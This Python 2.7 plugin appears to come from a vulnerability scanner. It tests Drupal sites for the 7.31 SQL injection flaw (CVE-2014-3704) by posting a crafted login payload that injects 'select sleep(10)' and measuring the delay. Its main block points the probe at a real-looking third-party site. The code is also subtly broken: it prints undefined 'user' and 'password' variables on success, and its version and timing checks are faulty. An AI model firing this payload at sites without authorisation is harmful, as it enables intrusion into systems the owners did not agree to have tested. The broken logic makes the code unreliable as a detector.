#!/usr/bin/python2.7
#coding:utf-8

import urllib2
# import requests
from dummy import *

from time import time

info = {
	'NAME':'Drupal 7.31 SQL Injection',
	'AUTHOR':'yangbh',
	'TIME':'20141021',
	'WEB':'http://www.freebuf.com/vuls/47690.html',
	'DESCRIPTION':'Drupal 7.31 SQL注入漏洞（CVE-2014-3704）'
}

def Audit(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Drupal':
			if (services.has_key('cmsversion') and services['cmsversion']<='7.3.1' and services['cmsversion']>='7.0') or services.has_key('cmsversion')==False:
				try:
					url = services['url']
					target = '%s/?q=node&destination=node' % url
					post_data = "name[0%20;select+sleep(10);;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
					start1 = time()
					print 'start1:',start1
					urllib2.urlopen(url=url).read()
					end1 = time()
					print 'end1:',end1

					start = time()
					print 'start:',start
					content = urllib2.urlopen(url=target, data=post_data).read()
					end = time()
					print 'end:',end
					costtime = int(end-start-end1+start1) 
					print 'costtime:',costtime

					# print content
					if "mb_strlen() expects parameter 1" in content or end-start-end1+start1 in range(7,13):
						print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
						security_hole(url)
				except urllib2.HTTPError,e:
					print e
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.danpros.com','cms':'Drupal'}
	pprint(Audit(services))
	pprint(services)
